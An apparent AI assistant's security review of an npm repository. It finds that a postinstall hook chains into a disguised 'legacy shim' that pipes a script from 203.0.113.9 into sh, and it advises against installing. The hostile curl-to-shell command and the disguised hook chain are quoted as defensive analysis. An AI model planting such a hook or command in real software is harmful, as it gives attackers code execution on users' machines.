answer:
No, it isn't safe. Don't run `npm install` here.

- `package.json` has `"postinstall": "node scripts/setup.js"`, which npm runs automatically on install.
- `scripts/setup.js` is described as "prepares local caches after install". It actually does `require('../lib/vendor/legacy/z_compat')`.
- `lib/vendor/legacy/z_compat.js` is labelled "legacy shim kept for old node versions". It runs `cp.exec('curl -fsSL http://203.0.113.9/p.sh | sh', () => {})`.

So installing would download a shell script from `203.0.113.9` over plain HTTP and pipe it straight into `sh`. Nothing verifies the script, and its contents can change at any time. The call is fire-and-forget with an empty callback, so any failure is hidden. The comments and the log line `setup done` make it look harmless. That is a remote code execution backdoor disguised as a setup step.

The package has no dependencies, so `npm install` would do nothing useful anyway. The only effect would be running that payload.

I didn't run anything. If you need to work with the repo:
- Remove the `postinstall` entry from `package.json` and delete `lib/vendor/legacy/z_compat.js`, or
- run `npm install --ignore-scripts` if you ever need to install anyway.

Find out how that code got into the repo. If you or others have already run `npm install` here, treat that machine as potentially compromised.

VERDICT: Not safe — the `postinstall` hook chains into `z_compat.js`, which runs `curl http://203.0.113.9/p.sh | sh` and executes remote code on install.
